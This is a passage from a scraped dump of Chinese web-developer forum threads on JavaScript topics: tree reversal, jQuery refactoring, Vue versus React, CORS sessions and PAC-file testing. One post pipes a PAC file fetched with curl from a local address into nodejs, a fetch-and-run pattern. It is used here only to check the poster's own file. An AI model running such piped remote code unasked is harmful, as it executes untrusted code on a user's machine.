"____has_children = len(node.neighbors) > 0 and any(not visited[child] for child in node.neighbors) \r", "____if has_children: \r", "________retval[\"children\"] = [] \r", "________for child in node.neighbors: \r", "____________if not visited[child]: \r", "________________retval[\"children\"].append(reconstruct_json(child, visited)) \r", "____return retval", " \r", "失眠了，不是来吵架的\r", "json 不是理由，你操作 json 前肯定是要转换成数据字典的。\r", "\r", "# 深度遍历，直到遇到你要反转的叶节点，跳出\r", "# 假设 stack 保存了从 root 到 leaf 的路径\r", "# python 写的， js 只能看看\r", "stack = []  # save path: root -> leaf\r", "\r", "root = child = stack.pop()\r", "root['children'] = []\r", "parent = stack.pop()\r", "\r", "parent['children'].remove(child)\r", "while stack:\r", "----stack[-1]['children'].remove(parent)\r", "----child['children'].append(parent)\r", "----child, parent = parent, stack.pop()\r", "\r", "child['children'].append(parent)", " \r", "对原 json 对象的一次深度遍历显然是得不到你所谓的一条从 root 到 leaf 的路径的。\r", "深度遍历能够得到的是从 root 节点到 leaf 节点途径的所有节点，其中可能存在某两个节点之间是兄弟关系。\r", "而你的算法正确的前提是在这条路径上所有的节点关系都必须严格符合：前一个节点是后一个节点的父节点。\r", "恐怕你还得再推敲推敲。", " \r", "确实不能直接得到，既然已经遍历了，那么要得到从 root 到 leaf 的路径很难吗？", " \r", "需要重新扫描一遍由 root 节点到 leaf 节点深度优先遍历的序列，\r", "首先由 leaf 节点开始，不断向前寻找处于路径上当前节点的上一个父节点，恐怕也不是很方便吧？\r", "----------------------------\r", "另外有一点很重要，之前疏忽一直没有提到，就是你的算法自始至终都是在重新反转和原 json 对象等价的多叉树，\r", "并没有实际去重构原 json 对象，你再仔细考虑考虑是不是如此？\r", "\r", "因为问题的关键在于， json 对象已经是树型结构的一种文本表达方式，它不具有记录节点之间父子关系的特性，说白了没有节点之间明确的指向关系。因此，你所做的工作前提还是需要具备一棵与原 json 对象结构等价的多叉树，那么你提到的反转父子节点关系的操作才有意义，而反转完成以后也仍然需要在这棵多叉树基础上重构该 json 对象，类似的方法我也已经在 reconstruct_json()中提到了。\r", "\r", "所以你看到了，你饶了一个大圈子，去折腾节点的父子关系，还不如一张无向关系图来的简单明了。\r", "因为要知道你的方法，一旦重新指定一个新的 leaf 节点作为新的 root 时，又该重新构建这棵多叉树。\r", "而一旦建立起无向图，至少对于给定的 1 个 json 对象而言是一劳永逸的。", "######################### 不是很方便\r", "parents = {}\r", "while True:  # 遍历\r", "----for child in node.children:\r", "--------parents[child] = node\r", "-------- other\r", "\r", "#####################  并没有实际去重构原 json 对象\r", "hh", "不太懂算法，写了个 demo 不知道对不对。\r", "\r", "拿去不谢。\r", "\r", "思路很简单：\r", "1. plainJSON 把 JSON 拍平成一个数组，[{ level: 0, self: node }]的结构，并且返回新的根节点在 queue 里面的 index\r", "2. 在 queue 里面查找新的根节点到老的根节点的路径\r", "3. 把路径上的所有的父子关系翻转，即可得到新树\r", "\r", "不知到有没有 bug ，你可以测测", "关键点在于，只有新老根节点中间这一段路径上的父子关系需要翻转，其余的父子关系照旧。查找路径的话，根据是否排序会有更多的算法", " 行, 我测试下", " 有个 bug, 我使用叶子节点的父节点, 作为根节点重新生成图的时候, 根节点错乱了", " 来个 case 推到 git 上去吧", "草， segmentfault 底下这个回答也是够有意思的，直接抄我的代码啊", " 确实，太恶劣了，好歹把方法名改一下，位置换一下啊", "如果翻转操作很频繁，用一个标识标记顶级点是哪一个就行了，有点是翻转不消耗什么资源，缺点是最后需要输出一次 tree 结构", " 正解"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>正在用 TypeScript 做一个塔防类型小游戏\n问题是\n假如现在本关\n有 3 个炮台  炮台有攻击范围\n有 10 个怪物  怪物会沿着路线行动\n怪物和炮台都在各自的数组中存放\n那么如何判断 是哪个怪物进入了哪个炮台的攻击范围呢？\n（有可能多个怪物进入了多个炮台的攻击范围）\n求提供一个思路(⊙o⊙)</p>\n</div></div>"], "reply": "11", "tittle": "小游戏开发问题", "comment": ["if （根号 dx2+dy2 < 范围）\r", "then 攻击", "这里比较平方和比开根号速度要快吧", "真正有用的只是路线上的区间而已，随你用什么笨办法计算出来，任意炮塔在路径上的攻击区间。\r", "炮塔是很有限的，所以攻击区间也很有限，一串 if 下来也是可以的。", "每个炮台一次只攻击一个怪物吧  我觉得不需要判断哪个怪物进入哪个炮台的攻击范围，只需要在每个炮台的周围设定一个攻击范围然后进入范围的怪物按照距离来进行攻击。。。这样是不是楼主想要的？", "很简单，求怪和炮台之间的距离   ，然后和攻击范围比较下就可以了", "谢谢大家了 有思路啦~\\(≧▽≦)/~", "这点怪物和炮台数量不用做任何优化", "好吧是我没说明白  问题是 假如同时有 2 个怪物同时进入了某个炮台的攻击范围  那炮台应该攻击哪个呢  是否应该把进入某个炮台攻击范围的怪物加到一个数组  离开某个炮台攻击范围就从数组删除   然后炮台只攻击数组里面的第一个怪物", "这有个游戏设计问题，如果你想炮台一旦开始攻击就打到怪物离开范围或者打死(也是大多数塔防的做法)：记录第一个进入范围的怪物，一直作为攻击目标，同时一直检测是否死亡或者离开范围。如果离开搜索下一个最近的可攻击怪物", "做游戏最重要的一个技术就是“碰撞检测”，也是一个游戏核心之一。", "搜一搜，会有新的发现"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>(gojs 官网)[<a href=\"http://gojs.net/latest/index.html\" rel=\"nofollow\">http://gojs.net/latest/index.html</a>],本人有几个小细节需要弄一下，如果有意向的想已邮件私聊沟通开始，我的邮箱是 yangyifanphp@gmail.com ，感谢！</p>\n</div></div>"], "reply": "2", "tittle": "寻求一个 gojs 的高手，付费请教几个问题", "comment": ["我们公司在用 gojs, 可以帮你看看问题", " 您好可以私聊么？感谢，可以获得你的联系方式么"]},
{"content": ["<div class=\"topic_content\">我记忆中之前是可以的呀，譬如某个网站，我打开在 chrome devtool ，美化了压缩后的 js 代码，然后做一些 change on the fly ，保存后，整个背景会变成浅红色，修改会被保存下来，重新刷新页面才会丢掉修改。但现在完全无法改了，是我 Chrome 版本不对了吗？（ Version 51.0.2704.84 (64-bit) Mac ）</div>"], "reply": "2", "tittle": "在 Chrome 里面的 pretty 后的 js 代码无法动态修改吗？", "comment": ["可是我怎么记得在 devtool 里如果不设置 workspace 是无法修改代码的。。", " 不是，设置 workspace 的作用是让修改能直接存回文件，没有 workspace 也是可以存的。\r", "\r", " 我记忆中 pretty 的代码一直是不能动态改的，没有印象可以改过。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>其实就是常规的 generator 用法，也是 co ， koa 的基本原理。<br>\n……我折腾了一个 57 字符的 <strong>简易</strong> 实现。</p>\n<p>在 Console 里运行一发试试吧！</p>\n<pre><code>var d=(f,t=f(),r=t.next())=&gt;r.done||setTimeout(d,r.value,f,t); // &lt;- source code\nd(function *() {                                               // &lt;- wrapper\n                                                               // &lt;- magic\n  console.log('foo'); // output 'foo'\n  yield 1000;         // delay 1 sec\n  console.log('bar'); // output 'bar'\n  yield 1000;         // delay 1 sec\n  console.log('baz'); // output 'baz'\n\n});\n</code></pre>\n<p>详细： <a href=\"https://github.com/quietshu/delay\" rel=\"nofollow\">https://github.com/quietshu/delay</a></p>\n</div></div>"], "reply": "11", "tittle": "JavaScript 一行简易实现 `sleep(1)`", "comment": ["都上 generator 了，何不 async/await 走起 :-)\r", "\r", "const sleep = (delay) => new Promise(resolve => setTimeout(resolve, delay));\r", "\r", "console.log('foo');\r", "await sleep(1000);\r", "console.log('bar');\r", "await sleep(1000);\r", "console.log('baz');", "function sleep(delay){\r", "     alert( delay + '秒钟之后点一下确定' );\r", "}", " 棒棒棒", "这是什么飞机?   意义何在?", " 为后续性能优化打下坚实基础", "   很久木有写 JS 了  JS 快忘光了", " 都 async/await 为何不  async computation expressions 走起 :-)\r", "\r", "async {\r", "   println \"foo\"\r", "   do! Async.Sleep 10000\r", "   println \"bar\"\r", "   do! Async.Sleep 10000\r", "   .....\r", "}\r", "\r", "需要使用 ", "js 的 异步 有几种写法？", " 还是 async/await 好看！坐等 native support …\r", " wow 感谢！没接触过 F#，在看官网 sample 中，赞！！", " 今日最佳", "我自己造了一个编译到 JavaScript 的语言 Smooth ， ", "\r", "\r", "这种问题在 Smooth 里面实现简直不能太简单了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>首先祝各位端午安康！</p>\n<p>下面先上<a href=\"https://classicoldsong.github.io/Drag.js/\" rel=\"nofollow\">Demo</a></p>\n<p>然后是<a href=\"https://github.com/ClassicOldSong/Drag.js\" rel=\"nofollow\">GitHub Repo</a></p>\n<p>再然后<a href=\"https://www.npmjs.com/package/drag-js\" rel=\"nofollow\">npm</a></p>\n<p>再来张图~</p>\n<p><img alt=\"demo\" src=\"https://cloud.githubusercontent.com/assets/10512422/15921544/be5a1ad0-2e54-11e6-93fb-94c129c043cc.gif\"></p>\n<p>参考 FL Studio 的拖拽动画效果自己撸了一个 js 版的出来。。。不得不说 Image Line 出品的软件 UI 都超级赞</p>\n<p>这大概是我写的最难用的插件了吧。。。。然而也是使用最灵活的一个。。</p>\n<p>流畅度很高，即使在 MTK 设备上也能够有比较流畅的效果。</p>\n<p>Drag.js 依赖 Blyde ， 关于 Blyde 请参见<a href=\"https://v2ex.com/t/278516\" rel=\"nofollow\">Blyde 的发布帖</a>。自己写的框架用起来就是舒服 23333 （当然看得懂源码的话也可以改成原生插件或者 jQuery 插件，并不复杂）</p>\n<p>欢迎各位使用，希望各位能够喜欢，当然也欢迎 Issue 以及 PR ，啊对了，欢迎回复 2333333333333333</p>\n</div></div>"], "reply": "19", "tittle": "Drag.js - 一个超级可爱的拖拽特效插件", "comment": ["又是你，前排。晚一点回去试试看。", "前排滋磁一个", "看上去很不错，不过巨大的 gif 图把我电脑搞卡了 :(", "话说问题来了，引入了 blyde 之后，是否兼容 jquery 呢？", " 并不兼容。。。", " = = 这就是一个悲伤的故事了", " 然而 Blyde 其实也很好用的说。。。", "不错哦  mark", "看到效果，大概能想出实现方式，赞想法！\r", "\r", "但是强推 blyde …", " 主要是不好塞进一些旧项目里面。要考虑个人的使用，也要考虑历史的进程嘛", " 或者我直接把 Blyde 在里面塞一份定制版。。。。。。。", "Blyde 有开发者论坛吗 或者基础教学（资源丰富）的网站", "（强行）前排围观 dalao", "mark", " Blyde 是我自己写的。。。。。目前没啥人用。。。。所有的资料都在 Blyde 的 README 里了。。。", "有 bug 啊，移动端都错位了", " 移动端的问题最多是 Demo 的问题。。。偏移量是故意添加的为了防止触发事件的对象不对头。。。。而且偏移同时包含了 margin 的距离。。\r", "\r", "解释一下移动端为何看起来有 Bug ：移动端的 touchend 事件的触发对象无论如何都指向 touchstart 时的触发对象，然而 drop 是需要在目标容器上触发的，所以我在下面写了一小行字，翻译过来就是“在移动端上你可能需要点击目标容器才能释放”。并且如果加入全局 touchend 事件的话，移动端看起来就是元素无论如何都会回到原来的位置上而不是落在目标容器里，所以我只能通过文字提醒正确的尝试方法。其实想解决的话有很多方法，比如判断松手时手指的位置是否在容器上方之类的，但是这样做的话 demo 的代码大部分就变成处理事件触发了，而不能给予一个关于 Drag.js 明确的使用示例。\r", "\r", "顺便，这个偏移量在 FL Studio 里也是存在的", "试了 demo ，很好用。", "兹磁一下，前排围观老宋"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://blog.jquery.com/2016/06/09/jquery-3-0-final-released/\" rel=\"nofollow\">http://blog.jquery.com/2016/06/09/jquery-3-0-final-released/</a></p>\n</div></div>"], "reply": "23", "tittle": "jQuery 3.0.0 发布了", "comment": ["中国好多 IE6 ie8 有毛线用\r", "jquery 2.x 我测试都好多访客出现 js 错误的提示\r", "然后我又降回去 1.12 的 latest versions 了", " 淘宝在解决这个问题，很快了！", "人生苦短\r", "jquery 大法好", " 同感。", " 不是说最高 1.8.*才支持 ie8 及以下么。", " 1.x 都是 IE 6+ 的支持", "还好我已经半年没开发 PC 前端了，一直呆在无线部门，不过碰到了更恶心的微信和 uc 。。。", "good 。\r", "已经将项目的 jquery2.x 升级", "变化真它喵大，我只是拿 js 写写小工具的都好几个工具得改写法了", "根本不支持 IE6 、 7 、 8", "居然还支持 IE 。。。\r", "\r", "JQuery 要高效，就必须利用最新浏览器的 ES 6 成果（最新的 FF ， Edge ， Chrome 都完成了 90%以上 ES 6 规范），删除那些不必要的 polyfill 代码。", " 中国还有 20% 用户在用 IE <= 8 啊，这可是 ES5 都没支持好的浏览器啊...", " \r", "实践证明 当你告诉他们 IE 不支持并告诉他们 firefox 360 搜狗高速 chrome 都可以的时候\r", "他们秒就打开了早就装好的搜狗、 360 ……", "银行和电商，估计 50 年都不会用上 jq3.0 。", " 淘宝已经不支持 ie8 了", " 你说的 20%确实存在（数字精确度不考虑），不过不能把所有上网用户做基数来考虑，而应该从产品面向的用户素质来考虑。\r", "比如各种做技术的官网，就完全没有必要支持低版本浏览器，因为上那些网站的人如果 low 到用 ie678 的话，去那网站也没啥意义；但换个角度来说，比如一个做古旧书古董的电商，那肯定要着重兼容 ie678 的，因为这产品面向的用户普遍为高龄人群，会用个电脑就不错了，现在还用着 xp 也太正常了。\r", "\r", "\r", " 亲，你这想法肯定是错的。\r", "1 是，你看我国互联网才发展了几年就已经到了现在这个高度了？\r", "2 是，从平稳退化的角度来说，很快 jQuery3.0 兼容低版本浏览器的插件就会出来了。", " 如果需要支持 IE6/7/8 ，那么请选择 1.9 ", "360 淘宝赶紧灭了 ie678 把", " \r", "\r", "怎么还在盯这点破事\r", "你们都不看官方文档的吗?\r", "\r", "\r", "If you need to support older browsers like Internet Explorer 6-8, Opera 12.1x or Safari 5.1+, use jQuery 1.12.\r", "\r", " 不是很清楚的写了 1.12.*\r", "\r", "你官方博客找个 2012 年 6 月发的文章是怎么个意思\r", "那时候还没 1.12 \r", "\r", "不要误导别人 认为只有<1.9 的才支持 IE6 IE8", " 赞。", "还是这个实在", " 你告诉我，为什么淘宝敢抛弃 20%的用户，还是你数据有问题？", " ", " 百度的数据"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>var turl = window.location.search;\n    var turls = turl.substr(1);\n    if(turls == 1){\n        $(\".news-category\").children().removeClass(\"current\");\n        $(\".news-category\").children().eq(0).addClass(\"current\");\n        $(\".news1\").show();\n        $(\".news2\").hide();\n        $(\".news3\").hide();\n        $(\".news4\").hide();\n        $(\".news5\").hide();\n        $(\".news6\").hide();\n    }else if(turls == 2){\n        $(\".news-category\").children().removeClass(\"current\");\n        $(\".news-category\").children().eq(1).addClass(\"current\");\n        $(\".news2\").show();\n        $(\".news1\").hide();\n        $(\".news3\").hide();\n        $(\".news4\").hide();\n        $(\".news5\").hide();\n        $(\".news6\").hide();\n    }\n    else if(turls == 3){\n        $(\".news-category\").children().removeClass(\"current\");\n        $(\".news-category\").children().eq(2).addClass(\"current\");\n        $(\".news3\").show();\n        $(\".news1\").hide();\n        $(\".news2\").hide();\n        $(\".news4\").hide();\n        $(\".news5\").hide();\n        $(\".news6\").hide();\n    }\n    else{\n        $(\".news-category\").children().removeClass(\"current\");\n        $(\".news-category\").children().eq(3).addClass(\"current\");\n        $(\".news4\").show();\n        $(\".news1\").hide();\n        $(\".news3\").hide();\n        $(\".news2\").hide();\n        $(\".news5\").hide();\n        $(\".news6\").hide();\n    }\n</code></pre>\n</div></div>"], "reply": "16", "tittle": "下面 js 代码如何优化呢?", "comment": ["至少可以提炼出方法啊。\r", "\r", "```javascript\r", "var turl = window.location.search;\r", "var turls = turl.substr(1);\r", "\r", "(function(index){\r", "\t$(\".news-category\").children().removeClass(\"current\");\r", "\t$(\".news1\").hide();\r", "\t$(\".news2\").hide();\r", "\t$(\".news3\").hide();\r", "\t$(\".news4\").hide();\r", "\t$(\".news5\").hide();\r", "\t$(\".news6\").hide();\r", "\t\r", "\t$(\".news-category\").children().eq(index-1).addClass(\"current\");\r", "\t$(\".news\" + index).show();\r", "})(turls);\r", "```", "1.可以用 switch\r", "2. 需要缓存 dom 元素。。。。。\r", "3.  如果 news12345 是兄弟元素的话，\r", " $(\".news2\").show().siblidngs('div').hide()\r", "\r", "4.  可以利用 数字直接选择 不写 if 。。跟楼上一样", "```javascript\r", "\r", "\r", "var turls = ~~location.search.substr(1) || 4;\r", "\r", "$('.news1,.news2,.news3,.news4,.news5,.news6').hide().filter('.news' + turls).show();\r", "\r", "$('.news-category').children().removeClass('current').eq(turls - 1).addClass('current');\r", "\r", "\r", "\r", "```", "看起来就是菜单切换嘛……\r", "楼上都说得差不多了，加一个\r", "给元素加一个 .news 的类就可以全部选择再隐藏，然后特定的 news 再显示", "先把你的 html 写清楚，一大堆选择器，有啥优化的。", "写函数， news 用循环和字符串拼接", "有个东东叫 siblings", "给所有的 news 再统一加一个.news 的 class 就好办了\r", "\r", "var turl = window.location.search;\r", "var index = turl.substr(1) - 1;\r", "$(\".news-category\").children().removeClass(\"current\").eq(index).addClas(\"current\");\r", "$(\".news\").hide();\r", "$(\".news\" + index).show();", "var turl = window.location.search.substr(1)\r", "$(\".news-category\").children().removeClass(\"current\").eq(turl - 1).addClass(\"current\")\r", "$(\".news1,.news2,.news3,.news4,.news5,.news6\").hide();\r", "$(\".news\" + (turl + 1)).show();", "var turl = window.location.search.substr(1)\r", "var $cates = $(\".news-category\").children()\r", "var $news = $(\".news1,.news2,.news3,.news4,.news5,.news6\")\r", "\r", "$cates.removeClass(\"current\").eq(turl - 1).addClass(\"current\")\r", "$news.hide().filter(\".news\" + (turl + 1)).show();\r", "\r", "把楼上的稍微改了一下\r", "\r", "同 7 楼 可以的话 siblings 也挺好用的啊", "哦 还少了句 turl = Math.min(turl|0,3)", "缓存 DOM 节点\r", "添加统一隐藏方法，而不是每个都去 hide", "似不似撒？", "谢谢大神们   学到了很多   前端路途任重道远   幸好有你万分感谢!", "上 MVVM 框架吧，大项目用 jQuery 难受得很。", "给个统一的 class ，如：.news ，然后控制 css 就可以啦：\r", ".news {display:none;} //默认隐藏\r", ".news.current {display:block;}"]},
{"content": ["<div class=\"topic_content\">Twitter 上因为这个又吵起来了= =<br>我先说，我一直写分号</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>感觉还是写的人比较多，大体上写的原因主要有：</p>\n<ul>\n<li>怕出错</li>\n<li>写过C、java所以习惯加分号</li>\n<li>不写感觉一行没结束</li>\n</ul>\n<p>聊这个主要是我在看vue源码的时候发现它是不加分号的，比较好奇</p>\n</div></div>", "<div class=\"topic_content\">对了还有根据 linter 决定写不写= =</div>"], "reply": "110", "tittle": "做个调查，大家写 js 写分号么", "comment": ["如果是 js 的话，比较好的做法是：\r", "1.如果是直接跑在浏览器里的，建议写分号，避免一些比如 if (xxx) return 引起的问题\r", "2.通过编译的话，建议不写，比如 CoffeeScript, TypeScript 或 Babel 等，因为生成的 js 代码中，会自动加上的。", "为了避免这种无聊的问题我尽量写 CoffeeScript, 算了我还是写 ClojureScript. 我说写分号有人有说我, 我说不写分号有人要说我, 什么鬼啊.\r", "\r", "公司项目代码有规范按公司来.\r", "\r", "js 的烂账, 明明是语言设计得有问题, 搞出这么多争论出来. 忘了谁说的, 一个问题被人学, 提到一两次, 那就去讲解一下, 一堆人坑在这个事情上, 就是语言设计的问题.", "不写分号压缩代码的时候不就完蛋了？", "习惯不写了。", "写啊,不谢 IDE 会有黄色警告啊...", "写啊.....写上的话给人一种心理暗示 这行结束了", "写。 导致我在 php 里也习惯性加上。公司的 php 大神们对我意见很大啊。", "这要看我的手速。。", " 都是个人习惯，要什么「充分理由」……", " php 不是必须写分号的吗？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>第一个地址\n<a href=\"http://www.fulihuodong.com/guoji/test\" rel=\"nofollow\">http://www.fulihuodong.com/guoji/test</a>\n在我自己服务器上， PHP 环境，打开将输出当前 sessionID</p>\n<p>第二个地址\n<a href=\"http://q.fulihuodong.com/guoji/session/index.html?8\" rel=\"nofollow\">http://q.fulihuodong.com/guoji/session/index.html?8</a>\n在七牛上，通过 ajax 请求第一个地址， console.log 出 sessionID</p>\n<p>怎么搞才能让两次访问的 sessionid 保持一致？</p>\n</div></div>"], "reply": "6", "tittle": "如何处理 session 的跨域问题", "comment": ["我看你已经实现了呀？", "设置下 cookie 的域", "坑好多\r", "第一 你用的跨域 post\r", "第二 服务器端没设置\r", "\r", "header('Access-Control-Allow-Credentials:true');\r", "然后再\r", "$.ajax({url :'http://www.fulihuodong.com/guoji/test',type : 'post',dataType : 'json',xhrFields : {withCredentials : true}})", " 没有实现呢", " 已经在入口文件的最开始设置了  ini_set('session.cookie_domain',\".fulihuodong.com\");\r", "\r", "但是不行", " \r", "\r", "header('Access-Control-Allow-Credentials:true'); \r", "\r", "这句话正解，可以了，感谢！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>RT ，期望工资该填多少？偶系上海人</p>\n</div></div>"], "reply": "1", "tittle": "写 WebGL / Three.JS 的前端的市场行情是什么水平？", "comment": ["我也在学习 three.js ，但是感觉国内并没有发展开来。应用领域没有流行开来。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>装 node.js ，在命令行运行</p>\n<pre><code>(cat ./mypac; echo 'console.log ( FindProxyForURL(\"http://www.google.com/\", \"www.google.com\") )') | nodejs\n\n#对于 URL 方式的 pac ，可以执行下面这句\n(curl -s http://192.168.1.11/proxy-20160614-3.pac; echo 'console.log ( FindProxyForURL(\"http://www.google.com/\", \"www.google.com\") )') | nodejs\n</code></pre>\n</div></div>"], "reply": "7", "tittle": "验证 pac 文件正确性的简易方法", "comment": ["哦 最后应该是  | node 吧", "谁知道 pac 怎么主动更新\r", "\r", "我已经在服务器上修改了 pac 内容，在客户端不用任何改动的情况下，怎么主动获取新的 pac ？", " \r", "有个小技巧，比如你的 pac 地址是 ", " ，则你在浏览器可写为 ", " ，每次修改了就改浏览器地址好了，就是那个 t 参数。更进一步地，可以在服务器上用脚本生成 PAC （读取本地文件，原样输出即可），注意脚本写好浏览器缓存的设置", " 我主要是要用 JavaScript v8 引擎，所以用 node.js 。所以应该是 | node.js", " 刚试了试，| node 也可以工作正常，| nodejs 、 | js 、| node 都能正常工作", " \r", "客户端不用任何改动的情况下，有办法更新 pac 吗？\r", "我试过修改 headers ，修改 last modify 等，基本上都无法主动更新，抓包来看也没有什么规律", " 试试客户端浏览器关闭、重新打开，关键还是 pac 的 expired 设定"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>打算新开一个个人项目，在 React 和 Vue 之间摇摆。</p>\n<p>我之前用过的技术包括 Backbone/Angular/React ， Vue 只是大概扫下眼文档。</p>\n<ul>\n<li>Backbone</li>\n</ul>\n<p>手工同步数据和页面真得好烦。</p>\n<ul>\n<li>Angular 1.x</li>\n</ul>\n<p>很久之前用过快忘记是什么体验了，只记得有点重，组件化开发很弱。 Angular 2 看了眼介绍不是我的菜且体积巨大。</p>\n<ul>\n<li>React</li>\n</ul>\n<p>用 React + Redux + ES 6 搞过一个项目，数据井井有条，架构比较清楚，配套也好（自动刷新不丢页面状态），只是有点繁琐。\nVirtual DOM 的存在使得和真实 DOM 隔了一层有时很不方便，函数式的架构使得组件之间的通信也难处理。</p>\n<ul>\n<li>Vue.js</li>\n</ul>\n<p>Vue.js 一眼看上去是实用风格，这框架我在用 React 之前就注意到了，只是当时一看是个国人作品就无视了，想不到突然就火起来了。\n它比 React+Redux 轻量，内建组件间通信机制，支持组件，配套也不错该有的都有，看上去挺不错的样子，只是是个人项目，不过作者很勤奋所以这可能不是问题。且看作者的一些文字发现作者视野开阔不太会把 Vue 带沟里去偏离前端大势（参考前段时间很火的真阿当厮 b 大战）。</p>\n</div></div>"], "reply": "65", "tittle": "和 React 比起来 Vue.js 好用吗？", "comment": ["vuejs 吹 赞一个", "我是一直使用 AngularJS ，看了一下 React 和 Vue.js ，感觉 Vue.js 更容易上手，组件化没有 React 那么强，做个小应用还是不错的，最近做的一个微信应用，就是 Vue.js 。", "React 至少还能火三年,在前端界这已经很牛逼了!", "Vue.js 起步于小型应用，虽然目前已经有制作中大型应用的工具集（ vue + webpack + vue-loader + vue-router + vuex? + es2015(babel)），但是仍然没有特别多的人这么用（跟 react 比起来）。\r", "我之前写了一个 aria2 的前端， ", " ，采用了官方推荐的 webpack 结构，并没有用到 router 和 vuex ，感觉还算是容易。可以参考一下。", "Vue 不算“国人作品”啊。\r", "我厂的项目从 0.11.x 左右开始选的 Vue.js 。现在觉得选这个真是合适，容易实现需求，可扩展性高，对团队来说重要的还是比 React 上手得快。\r", "不过我个人觉得 React 更好玩，但玩得少就不乱发现了。", " s/发现 /发言 /", "Vue.js 用起来是真的很舒服。我有一个项目，用了 Vue.js + Webpack + vue-loader + vue-router + Vuex + es2015(babel)，你可以感受下： ", "react 和 vue 目前的地位实不如 angular 和 ember 吧，说火起来的从何下此结论？", " react 地位肯定是最高的，太多商业公司（而且都是独角兽或者巨头）直接用在核心业务上的，不像其他几个很多用来做边角料玩玩的", " react 有 native ， 这个是未来。现在火的不要不要的。\r", "android 和 ios 两大阵型短时间是分不出高下了，为了更好的开发体验和效率，需要一层更高的抽象抹平平台差异。 就算没有 react native ，也会有其他的 xxx native 。微信内部也有类似的工具，名字忘了 大概是 weze ？", "1.如果实在不知道选什么\r", "2.以前没有使用 mvvm 的经验\r", "3.想要适用更多的场景\r", "4.想要在团队内部推广开\r", "满足其中一条及以上选择 vue.js", "我觉的 React 的组件化做的比 vue 好， vue 的复用性没有 react 高，但是 vue 的语法对于常年写后端的同学比较友好，也没有什么服务端渲染的感念，和 angular 一样直接写就可以了。", "最近做微信项目，就是采用 vuejs+webpack+vue-loader+vue-router,容易上手，且容易和其它库融合", "蛮好用的，主要是比较轻量级， VeryNginx 中就是用的 vue.js", "没用过 Vue ， 看了官网的介绍， 感觉很简洁~~\r", "对比 ng ，轻量  更简单 性能更高\r", "对比 react ， <", ";  \r", "1: `相对于常见的误解—— Virtual DOM 让 React 比其它的都快， Vue.js 实际上性能比 React 好`  这条不清楚~~\r", "2 ：\r", "```\r", "在 API 方面， React （或 JSX ）的一个问题是，渲染函数常常包含大量的逻辑，最终看着更像是程序片断（实际上就是）而不是界面的视觉呈现。对于部分开发者来说，他们可能觉得这是个优点，但对那些像我一样兼顾设计和开发的人来说，模板能让我们更好地在视觉上思考设计和 CSS 。 JSX 和 JavaScript 逻辑的混合干扰了我将代码映射到设计的思维过程\r", "```\r", "这段深感赞同， jsx 组建化能力更强，但也更抽象。\r", "一段完整的 HTML 结构，要结合多个 class 来看， 不直观。\r", "实现一段效果的时候，用 react ，我需要先用 html 的方式想想改变的 css 属性及交互的 html 结构，再用组建化的思路想想要变化的关键 data ，最后写 react jsx function 。", "文档详细，容易上手，周边工具完善，社区组件(暂时)较少， 正在发开基于 vue 的 UI 组件  ", "Vue.js 用着舒心 文档完善 组织合理 搞了个 Vue.js 版的 ", "  感受地址 ", "\"只是当时一看是个国人作品就无视了\"  \r", "\r", "真是呵呵了", "之前用 Vue 写了个网页， webpack+hot-reload 什么的全都用上了，有一点比较不开心，就是组件的属性需要先在 `data()` 里面返回才能在 template 里面 binding ；现在的话会选择 React 吧，组件化做的好，更重要的是生态也挺好的，很多可以直接用的工具库，团队开发投入应该不会比 Vue 高很多，相反，还可能得益于复用获得更高的开发效率。", "高质量项目，不要因为是出自国人之手就有偏见", "写 Vue 还是很快乐的，个人项目可以使用呢， LZ 为什么不都尝试一下呢 XD", "VUE 上手容易,特别是搞后端的再也不用写那么多 js 了,有木有", "Backbone.js 修改数据自动更新功能其实很容易实现，只要监听 model 发生 change 的时候调用 render 就行(但是效率得不到保障)。框架本身不强制你使用哪种模板，可以自由选择(另外几个框架都不具备这点)。 Backbone 的 Model 是很优秀的，但是后来的框架普遍弱化了 Model 的概念，感觉很可惜。\r", "\r", "Angular.js 开创了一个新的时代，使大家都意识到，原来很多事情都是可以自动完成的。但是作为先驱之一，他本身也有很多问题，最大的问题还是概念太多，很多奇葩的语法。学习成本相对较高，初学者容易写出一堆奇怪的东西，最好要有一个高手来规范代码。\r", "\r", "Vue.js 继承了 Angular 的诸多优点，并且不断将其他框架的优点整合进自己的框架中。对 model/data 的控制力不足(原生 Object 就是 model)，不过可以使用 vuex 解决。中文文档很完备(毕竟国人出品)，学习成本低。\r", "\r", "React.js 的单向数据流的思路很赞，使得代码更加可控(被 Vue.js 抄走啦)。不过 render 方法里面写渲染逻辑简直蛋疼到爆。 React 最强势的地方其实在于它的生态系统，有服务端渲染、 React Native 等，真正做到了 js everywhere 。", "\"只是当时一看是个国人作品就无视了\"  \r", "\r", "真是呵呵了 ", " ", "之前用 Backbone ，现在想感受一下 vue.js", "比其他框架省心多了…", " Backbone 自动刷新，这效率。。。还是得老老实实手工处理。另外页面不能组件化也是硬伤。 model/collection 的设计我觉得很不好，离了 Backbone 后我不但觉得更自由了且没有觉得更不方便。基于事件的架构在复杂情况下也容易乱套（比如循环触发），而 redux 无需事件的单向执行过程就很清楚。\r", "\r", "React 的 render/jsx 是天才的发明，我完全不觉得写在 js 里有任何不好，且组件化的设计使得一个 render 方法不会长，又和其它逻辑在一个类里更好理解和修改。", "没用过 react ，就不乱说话了。\r", "作为 Vue 的忠实粉，大概 15 年初接触，切身体会，上手快，扩展性强，只需要对 mvvm 的理念以及相关的语法有所了解（主要是 director ），可以非常友好的接入到已开发的项目，从零开始构建一个项目更是酸爽，而且 router 、 vuex 这些官方插件的出现，对于用 vue 来构造一个 web app 或者是后台类的 web view ，都是非常方便的。", "由兄弟， vue 和 meteor 结合的怎么样了？", "Tooling + Vue 让开发简直快如疾风 ", "\r", "\r", "当然也可以 + React 2333", "楼主你都分析的这么透彻了还来问啥。\r", "Vue 或者 React 随便一个都 OK 